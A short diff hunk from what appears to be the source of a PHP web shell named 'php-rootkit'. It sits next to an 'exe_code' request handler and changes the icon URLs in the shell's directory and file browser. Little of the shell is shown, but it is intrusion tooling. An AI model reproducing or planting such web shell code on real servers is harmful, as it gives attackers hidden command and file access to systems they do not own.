@@ -290,10 +290,10 @@ if(isset($_REQUEST['exe_code'])) {
         $scndir = scandir($dir);
         foreach($scndir as $sdir) {
           if(is_dir($dir."/".$sdir)) {
-            echo "<a href='?d=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/dtafalonso/yosemite-flat/256/Folder-icon.png'/> ".htmlspecialchars($sdir)."</a><br>";
+            echo "<a href='?d=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/folder.png'/> ".htmlspecialchars($sdir)."</a><br>";
           }
           if(is_file($dir."/".$sdir)) {
-            echo "<a href='?file=$dir/$sdir'><img height='20' src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png'/> ".htmlspecialchars($sdir)."</a><br>";
+            echo "<a href='?file=$dir/$sdir'><img height='20' src='https://raw.githubusercontent.com/ICWR-TECH/php-rootkit/master/file.png'/> ".htmlspecialchars($sdir)."</a><br>";
           }
         }
       }
